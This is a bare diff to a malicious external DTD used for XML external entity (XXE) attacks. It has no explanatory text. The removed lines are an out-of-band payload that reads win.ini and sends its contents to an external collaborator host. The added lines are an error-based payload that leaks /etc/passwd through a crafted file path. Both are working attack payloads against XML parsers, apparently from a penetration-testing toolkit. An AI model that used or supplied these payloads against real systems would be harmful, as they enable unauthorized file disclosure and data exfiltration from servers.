@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "file:///C:\Windows\win.ini">
-<!ENTITY % param1 '<!ENTITY &#37; external SYSTEM "https://uhfjpddr6j5l7o5092uztnr9i0orcj47t.oastify.com/x=%payload;">'>
-%param1;
-%external;
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+%eval;
+%error;
